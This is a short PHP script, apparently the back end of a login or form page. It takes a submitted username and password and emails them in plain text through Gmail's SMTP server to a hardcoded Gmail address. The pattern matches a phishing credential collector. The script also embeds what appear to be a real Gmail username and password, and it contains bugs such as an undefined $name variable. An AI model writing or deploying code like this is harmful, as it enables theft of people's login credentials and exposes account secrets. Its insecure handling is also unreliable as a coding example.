<?php 
if(isset($_POST['submit'])){
  if(isset($_POST['answer']) && $_POST['answer'] == 4){
  $username = $_POST['username'];
  $password = $_POST['password'];
  $mail = new PHPMailer();  
  $mail->IsSMTP();
  $mail->Mailer = "smtp";
  
  $mail->SMTPDebug  = 1;  
  $mail->SMTPAuth   = TRUE;
  $mail->SMTPSecure = "tls";
  $mail->Port       = 587;
  $mail->Host       = "smtp.gmail.com";
  $mail->Username   = "arivu1243@gmail.com";
  $mail->Password   = "Silence@93";

  $mail->IsHTML(true);
  $mail->AddAddress("arivu1243@gmail.com", "recipient-name");  
  $mail->SetFrom($name, "from-name");
  $mail->Subject = "Test is Test Email sent via Gmail SMTP Server using PHP Mailer";
  $content = "From: $name \n Message: \n Username:$username Password:$password";

  $mail->MsgHTML($content); 
  if(!$mail->Send()) {
    echo "Error while sending Email.";
    var_dump($mail);
  } else {
    echo "Email sent successfully";
  }
  }
  else{
    echo "Security answer is incorrect";
  }
} 
?>
